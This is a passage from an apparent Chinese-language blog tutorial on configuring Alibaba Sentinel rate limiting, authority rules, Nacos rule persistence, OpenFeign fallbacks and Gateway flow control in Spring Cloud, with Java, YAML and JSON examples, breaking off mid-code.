<p>  <code>http://localhost:8401/testHotKey?p2=1</code></p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/testHotKey&quot;)</span></span><br><span class="line"><span class="meta">@SentinelResource(value = &quot;testHotKey&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testHotKey</span><span class="params">(<span class="meta">@RequestParam(value = &quot;p1&quot;,required = false)</span> String p1, </span></span><br><span class="line"><span class="params">                         <span class="meta">@RequestParam(value = &quot;p2&quot;,required = false)</span> String p2)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;------testHotKey&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Fushiye/BlogPicture/main/img_blog/20250305221339.png"></p>
<h4 id="参数例外项（特定参数值限流豁免）"><a href="#参数例外项（特定参数值限流豁免）" class="headerlink" title="参数例外项（特定参数值限流豁免）"></a>参数例外项（特定参数值限流豁免）</h4><p>在高级选项中可以设置参数例外项，即当P1参数的参数值为2时，即使每秒请求达到1次，但只要没有达到100次都不会限流，如果达到200次会限流。<strong>注意，填写完规则后一定要点击添加按钮才会添加！！</strong></p>
<p><img src="D:\workinenglish\typora_image\image-20250305222038825.png" alt="image-20250305222038825"></p>
<h3 id="授权规则"><a href="#授权规则" class="headerlink" title="授权规则"></a>授权规则</h3><p>很多时候，我们需要根据调用方来限制资源是否通过，这时候可以使用 Sentinel 的黑白名单控制的功能。黑白名单根据资源的请求来源（<code>origin</code>）限制资源是否通过，若配置白名单则只有请求来源位于白名单内时才可通过；若配置黑名单则请求来源位于黑名单时不通过，其余的请求通过。</p>
<p><a href="https://sentinelguard.io/zh-cn/docs/origin-authority-control.html">官方文档</a></p>
<p><strong>配置：</strong></p>
<p><strong>步骤1：</strong>实现  接口并重写 方法，说明如何判定请求来源：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyRequestOriginParser</span> <span class="keyword">implements</span> <span class="title class_">RequestOriginParser</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">parseOrigin</span><span class="params">(HttpServletRequest httpServletRequest)</span> &#123;</span><br><span class="line">        <span class="comment">// 根据请求参数serverName判断请求来源，在实际生产中可以通过getCookies()等来区分不同请求来源</span></span><br><span class="line">        <span class="keyword">return</span> httpServletRequest.getParameter(<span class="string">&quot;serverName&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="D:\workinenglish\typora_image\image-20250305224026542.png" alt="image-20250305224026542"></p>
<p>仅有<code>http://localhost:8401/empower?serverName=a</code>和<code>http://localhost:8401/empower?serverName=b</code>可以访问，其他均被限流</p>
<p>可以对不同的接口采取不同的优先检查：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">parseOrigin</span><span class="params">(HttpServletRequest httpServletRequest)</span> &#123;</span><br><span class="line">       <span class="comment">// 获取请求的资源名称或其他标识符</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> httpServletRequest.getRequestURI();</span><br><span class="line">       </span><br><span class="line">       <span class="comment">// 假设某些接口路径需要优先检查cookie</span></span><br><span class="line">       <span class="keyword">if</span> (resource.startsWith(<span class="string">&quot;/api/cookie-priority&quot;</span>)) &#123;</span><br><span class="line">           <span class="keyword">return</span> checkCookiePriority(httpServletRequest);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">// 其他接口优先检查serverName</span></span><br><span class="line">       <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> checkServerNamePriority(httpServletRequest);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>





<h3 id="规则持久化"><a href="#规则持久化" class="headerlink" title="规则持久化"></a>规则持久化</h3><p>将 Sentinel 限流配置规则持久化到 Nacos 保存后，只要刷新访问URL，Sentinel就能自动扫描到Nacos中保存的配置，可以确保在应用重启后，流量控制、熔断降级等规则不会丢失。Nacos 作为配置中心，能够动态管理这些规则，并且支持实时更新。</p>
<h4 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h4><p>主要是<code>sentinel-datasource-nacos</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--SpringCloud ailibaba sentinel-datasource-nacos --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.csp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sentinel-datasource-nacos<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--SpringCloud alibaba sentinel --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-sentinel<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--nacos-discovery--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="编写配置文件"><a href="#编写配置文件" class="headerlink" title="编写配置文件"></a>编写配置文件</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">sentinel:</span></span><br><span class="line">      <span class="attr">datasource:</span>	</span><br><span class="line">        <span class="attr">ds1:</span>								    <span class="comment"># 规则名，自定义		</span></span><br><span class="line">          <span class="attr">nacos:</span></span><br><span class="line">            <span class="attr">server-addr:</span> <span class="string">localhost:8848</span>			<span class="comment"># Nacos 运行地址端口</span></span><br><span class="line">            <span class="attr">dataId:</span> <span class="string">$&#123;spring.application.name&#125;</span>  <span class="comment"># Nacos 添加配置的 DataId</span></span><br><span class="line">            <span class="attr">groupId:</span> <span class="string">DEFAULT_GROUP</span>				<span class="comment"># Nacos 添加配置的 GroupId</span></span><br><span class="line">            <span class="attr">data-type:</span> <span class="string">json</span>						<span class="comment"># 配置格式</span></span><br><span class="line">            <span class="attr">rule-type:</span> <span class="string">flow</span> 					<span class="comment"># Sentinel的规则类型：流控、熔断、热点、授权、系统保护</span></span><br></pre></td></tr></table></figure>

<p><code>rule-type</code>：可在<code>com.alibaba.cloud.sentinel.datasource.RuleType</code>查看源码。</p>
<ul>
<li><code>FLOW</code>：流量控制规则</li>
<li><code>DEGRADE</code>：熔断降级规则</li>
<li><code>PARAM_FLOW</code>：热点规则</li>
<li><code>SYSTEM</code>：系统保护规则</li>
<li><code>AUTHORITY</code>：访问控制规则（授权规则）</li>
</ul>
<h4 id="添加Nacos配置规则"><a href="#添加Nacos配置规则" class="headerlink" title="添加Nacos配置规则"></a>添加Nacos配置规则</h4><p><img src="https://raw.githubusercontent.com/Fushiye/BlogPicture/main/img_blog/20250306004206.png"></p>
<h5 id="1-流控规则（Flow-Rule）"><a href="#1-流控规则（Flow-Rule）" class="headerlink" title="1. 流控规则（Flow Rule）"></a>1. 流控规则（Flow Rule）</h5><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/rateLimit/byUrl&quot;</span><span class="punctuation">,</span>		<span class="comment">// 资源名称</span></span><br><span class="line">        <span class="attr">&quot;limitApp&quot;</span><span class="punctuation">:</span> <span class="string">&quot;default&quot;</span><span class="punctuation">,</span>				<span class="comment">// 来源应用</span></span><br><span class="line">        <span class="attr">&quot;grade&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span>							<span class="comment">// 阈值类型，0为线程数，1为QPS（异常比例）</span></span><br><span class="line">        <span class="attr">&quot;count&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span>							<span class="comment">// 单机阈值</span></span><br><span class="line">        <span class="attr">&quot;strategy&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span>						<span class="comment">// 流控模式：0为直接，1为关联，2为链路</span></span><br><span class="line">        <span class="attr">&quot;controlBehavior&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span>				<span class="comment">// 流控效果：0为快速失败，1为WarmUP，2为排队等待</span></span><br><span class="line">        <span class="attr">&quot;clusterMode&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span>				<span class="comment">// 是否集群</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>

<h5 id="2-熔断规则（Degrade-Rule）"><a href="#2-熔断规则（Degrade-Rule）" class="headerlink" title="2. 熔断规则（Degrade Rule）"></a>2. 熔断规则（Degrade Rule）</h5><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yourResourceName&quot;</span><span class="punctuation">,</span> <span class="comment">// 资源名称，通常是你要保护的接口或方法的名字。</span></span><br><span class="line">    <span class="attr">&quot;count&quot;</span><span class="punctuation">:</span> <span class="number">50</span><span class="punctuation">,</span> <span class="comment">// 阈值，具体含义依赖于 grade 的值：</span></span><br><span class="line">                 <span class="comment">// - 当 grade 为 1 时，表示错误比例（百分比）；</span></span><br><span class="line">                 <span class="comment">// - 当 grade 为 0 时，表示慢调用比例阈值。</span></span><br><span class="line">    <span class="attr">&quot;grade&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span> <span class="comment">// 触发熔断的条件类型：0 表示基于慢调用比例；1 表示基于异常比例。</span></span><br><span class="line">    <span class="attr">&quot;minRequestAmount&quot;</span><span class="punctuation">:</span> <span class="number">5</span><span class="punctuation">,</span> <span class="comment">// 在统计时间窗口内，至少需要多少个请求才会触发熔断判断。</span></span><br><span class="line">    <span class="attr">&quot;statIntervalMs&quot;</span><span class="punctuation">:</span> <span class="number">20000</span><span class="punctuation">,</span> <span class="comment">// 统计时间窗口的长度，单位为毫秒，默认20秒。</span></span><br><span class="line">    <span class="attr">&quot;slowRatioThreshold&quot;</span><span class="punctuation">:</span> <span class="number">0.5</span><span class="punctuation">,</span> <span class="comment">// 慢调用比例阈值，仅在 grade 为 0 时有效。</span></span><br><span class="line">    <span class="attr">&quot;maxAllowedRt&quot;</span><span class="punctuation">:</span> <span class="number">50</span><span class="punctuation">,</span> <span class="comment">// 最大允许响应时间，单位为毫秒，仅在 grade 为 0 时有效。</span></span><br><span class="line">    <span class="attr">&quot;timeWindow&quot;</span><span class="punctuation">:</span> <span class="number">10</span> <span class="comment">// 熔断后持续的时间，单位为秒。</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>

<h5 id="3-热点参数规则（Param-Flow-Rule）"><a href="#3-热点参数规则（Param-Flow-Rule）" class="headerlink" title="3. 热点参数规则（Param Flow Rule）"></a>3. 热点参数规则（Param Flow Rule）</h5><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yourResourceName&quot;</span><span class="punctuation">,</span> <span class="comment">// 资源名称，通常是你要保护的接口或方法的名字。</span></span><br><span class="line">    <span class="attr">&quot;paramIdx&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span> <span class="comment">// 参数索引，指定对哪个参数进行热点参数限流。</span></span><br><span class="line">    <span class="attr">&quot;count&quot;</span><span class="punctuation">:</span> <span class="number">10</span><span class="punctuation">,</span> <span class="comment">// 限流阈值，表示允许的最大 QPS 或并发线程数。</span></span><br><span class="line">    <span class="attr">&quot;grade&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span> <span class="comment">// 限流类型：0 表示基于并发线程数的限流；1 表示基于 QPS 的限流。</span></span><br><span class="line">    <span class="attr">&quot;durationInSec&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span> <span class="comment">// 统计时间窗口的长度，单位为秒。</span></span><br><span class="line">    <span class="attr">&quot;controlBehavior&quot;</span><span class="punctuation">:</span> <span class="number">0</span> <span class="comment">// 流控效果：0 表示快速失败，直接拒绝超过阈值的请求；1 表示 Warm Up 模式；2 表示匀速排队模式。</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>

<h5 id="4-授权规则（Authority-Rule）"><a href="#4-授权规则（Authority-Rule）" class="headerlink" title="4. 授权规则（Authority Rule）"></a>4. 授权规则（Authority Rule）</h5><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yourResourceName&quot;</span><span class="punctuation">,</span> <span class="comment">// 资源名称，通常是你要保护的接口或方法的名字。</span></span><br><span class="line">    <span class="attr">&quot;limitApp&quot;</span><span class="punctuation">:</span> <span class="string">&quot;appA,appB&quot;</span><span class="punctuation">,</span> <span class="comment">// 应用名称，用于标识哪些应用受到该规则的影响。多个应用名称用逗号分隔。</span></span><br><span class="line">    <span class="attr">&quot;strategy&quot;</span><span class="punctuation">:</span> <span class="number">0</span> <span class="comment">// 授权策略：0 表示白名单策略；1 表示黑名单策略。</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yourResourceName&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;limitApp&quot;</span><span class="punctuation">:</span> <span class="string">&quot;appC&quot;</span><span class="punctuation">,</span> <span class="comment">// 黑名单应用</span></span><br><span class="line">    <span class="attr">&quot;strategy&quot;</span><span class="punctuation">:</span> <span class="number">1</span> <span class="comment">// 授权策略：1 表示黑名单策略。</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>

<h5 id="5-系统规则（System-Rule）"><a href="#5-系统规则（System-Rule）" class="headerlink" title="5. 系统规则（System Rule）"></a>5. 系统规则（System Rule）</h5><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;highestSystemLoad&quot;</span><span class="punctuation">:</span> <span class="number">32.0</span><span class="punctuation">,</span> <span class="comment">// 最高系统负载阈值。</span></span><br><span class="line">    <span class="attr">&quot;highestCpuUsage&quot;</span><span class="punctuation">:</span> <span class="number">0.8</span><span class="punctuation">,</span> <span class="comment">// 最高 CPU 使用率阈值。</span></span><br><span class="line">    <span class="attr">&quot;qps&quot;</span><span class="punctuation">:</span> <span class="number">100</span><span class="punctuation">,</span> <span class="comment">// 系统级别的 QPS 阈值。</span></span><br><span class="line">    <span class="attr">&quot;threadCount&quot;</span><span class="punctuation">:</span> <span class="number">100</span><span class="punctuation">,</span> <span class="comment">// 系统级别的并发线程数阈值。</span></span><br><span class="line">    <span class="attr">&quot;avgRt&quot;</span><span class="punctuation">:</span> <span class="number">50</span> <span class="comment">// 平均响应时间阈值，单位为毫秒。</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>



<h3 id="OpenFeign整合实现fallback服务降级"><a href="#OpenFeign整合实现fallback服务降级" class="headerlink" title="OpenFeign整合实现fallback服务降级"></a>OpenFeign整合实现fallback服务降级</h3><p>在原本的程序中，无论使用 [1] 还是 [2] 进行服务降级处理，都要针对每个接口在注解中声明其的服务降级方法，现在可以在类中说明即可。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//【1】 CircuitBreaker方案</span></span><br><span class="line"><span class="meta">@RateLimiter(name = &quot;cloud-payment-service&quot;,fallbackMethod = &quot;myRateLimitFallback&quot;)</span>  </span><br><span class="line"><span class="comment">//【2】 Sentinel方案</span></span><br><span class="line"><span class="meta">@SentinelResource(value = &quot;testHotKey&quot;, blockHandler = &quot;dealHandler_testHotKey&quot;)</span></span><br></pre></td></tr></table></figure>

<h4 id="在服务提供者模块引入sentinel并开启支持"><a href="#在服务提供者模块引入sentinel并开启支持" class="headerlink" title="在服务提供者模块引入sentinel并开启支持"></a>在服务提供者模块引入sentinel并开启支持</h4><p>引入依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-sentinel<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>配置开启sentinel</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">sentinel:</span></span><br><span class="line">      <span class="attr">transport:</span></span><br><span class="line">        <span class="attr">dashboard:</span> <span class="string">localhost:8080</span> <span class="comment">#配置Sentinel dashboard控制台服务地址</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">8719</span></span><br></pre></td></tr></table></figure>

<p>编写接口时无需再指定fallback，由 统一指定</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/pay/nacos/get/&#123;orderNo&#125;&quot;)</span></span><br><span class="line"><span class="comment">// 无需再指定fallback，由 统一指定</span></span><br><span class="line"><span class="meta">@SentinelResource(value = &quot;getPayByOrderNo&quot;,blockHandler = &quot;handlerBlockHandler&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResultData <span class="title function_">getPayByOrderNo</span><span class="params">(<span class="meta">@PathVariable(&quot;orderNo&quot;)</span> String orderNo)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//模拟从数据库查询出数据并赋值给DTO</span></span><br><span class="line">    <span class="type">PayDTO</span> <span class="variable">payDTO</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PayDTO</span>();</span><br><span class="line">    payDTO.setId(<span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">return</span> ResultData.success(<span class="string">&quot;查询返回值：&quot;</span>+payDTO);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> ResultData <span class="title function_">handlerBlockHandler</span><span class="params">(<span class="meta">@PathVariable(&quot;orderNo&quot;)</span> String orderNo, BlockException exception)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ResultData.fail(ReturnCodeEnum.RC500.getCode(),<span class="string">&quot;getPayByOrderNo服务不可用，&quot;</span> +</span><br><span class="line">            <span class="string">&quot;触发sentinel流控配置规则&quot;</span>+<span class="string">&quot;\t&quot;</span>+<span class="string">&quot;o(╥﹏╥)o&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="API工具模块引入sentinel并统一指定服务降级处理方法"><a href="#API工具模块引入sentinel并统一指定服务降级处理方法" class="headerlink" title="API工具模块引入sentinel并统一指定服务降级处理方法"></a>API工具模块引入sentinel并统一指定服务降级处理方法</h4><p>引入sentinel依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--alibaba-sentinel--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-sentinel<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p> 在对外暴露方法的接口处，使用<code>@FeignClient</code>注解参数<code>fallback</code>直接统一指定服务降级处理方法所在类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FeignClient(value = &quot;nacos-payment-provider&quot;,fallback = PayFeignSentinelApiFallBack.class)</span></span><br></pre></td></tr></table></figure>

<p>新建服务降级处理类及方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PayFeignSentinelApiFallBack</span> <span class="keyword">implements</span> <span class="title class_">PayFeignSentinelApi</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ResultData <span class="title function_">getPayByOrderNo</span><span class="params">(String orderNo)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ResultData.fail(ReturnCodeEnum.RC500.getCode(),<span class="string">&quot;对方服务宕机或不可用，FallBack服务降级o(╥﹏╥)o&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="服务调用者引入sentinel并激活Sentinel对Feign的支持"><a href="#服务调用者引入sentinel并激活Sentinel对Feign的支持" class="headerlink" title="服务调用者引入sentinel并激活Sentinel对Feign的支持"></a>服务调用者引入sentinel并激活Sentinel<strong>对</strong>Feign的支持</h4><p>同样引入依赖，编写配置文件</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 激活Sentinel对Feign的支持</span></span><br><span class="line"><span class="attr">feign:</span></span><br><span class="line">  <span class="attr">sentinel:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>本节中springboot、springcloud、springcloudalibaba版本对应如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--        &lt;spring.boot.version&gt;3.2.0&lt;/spring.boot.version&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;spring.cloud.version&gt;2023.0.0&lt;/spring.cloud.version&gt;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">spring.boot.version</span>&gt;</span>3.0.9<span class="tag">&lt;/<span class="name">spring.boot.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">spring.cloud.version</span>&gt;</span>2022.0.2<span class="tag">&lt;/<span class="name">spring.cloud.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">spring.cloud.alibaba.version</span>&gt;</span>2022.0.0.0-RC2<span class="tag">&lt;/<span class="name">spring.cloud.alibaba.version</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>仅对本节如此，学完后恢复</p>
<h3 id="Gateway整合实现服务限流"><a href="#Gateway整合实现服务限流" class="headerlink" title="Gateway整合实现服务限流"></a>Gateway整合实现服务限流</h3><p>结合 Spring Cloud Gateway 和 Sentinel，可以在网关层面对所有请求进行统一的流量控制和限流，而不需要在每个微服务中单独配置。</p>
<p><a href="http://sentinelguard.io/zh-cn/docs/api-gateway-flow-control.html">官方指导</a></p>
<p>网关模块引入依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.csp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sentinel-transport-simple-http<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.csp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sentinel-spring-cloud-gateway-adapter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.annotation<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.annotation-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>编写配置类</strong></p>
<p>其他环节直接复制，<code>doInit()</code>方法内的<code>initBlockHandler();</code>需要自己编写。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GatewayConfiguration</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;ViewResolver&gt; viewResolvers;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ServerCodecConfigurer serverCodecConfigurer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">GatewayConfiguration</span><span class="params">(ObjectProvider&lt;List&lt;ViewResolver&gt;&gt; viewResolversProvider, ServerCodecConfigurer serverCodecConfigurer)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.viewResolvers = viewResolversProvider.getIfAvailable(Collections::emptyList);</span><br><span class="line">        <span class="built_in">this</span>.serverCodecConfigurer = serverCodecConfigurer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@Order(Ordered.HIGHEST_PRECEDENCE)</span></span><br><span class="line">    <span class="keyword">public</span> SentinelGatewayBlockExceptionHandler <span class="title function_">sentinelGatewayBlockExceptionHandler</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// Register the block exception handler for Spring Cloud Gateway.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SentinelGatewayBlockExceptionHandler</span>(viewResolvers, serverCodecConfigurer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@Order(-1)</span></span><br><span class="line">    <span class="keyword">public</span> GlobalFilter <span class="title function_">sentinelGatewayFilter</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SentinelGatewayFilter</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 初始化方法，在依赖注入完成后自动调用。</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;</span></span><br><span class="line"><span class="comment">     * 使用&#123;<span class="doctag">@link</span> javax.annotation.PostConstruct&#125;注解标记该方法，</span></span><br><span class="line"><span class="comment">     * 以确保在Spring容器完成依赖注入后执行初始化操作。</span></span><br><span class="line"><span 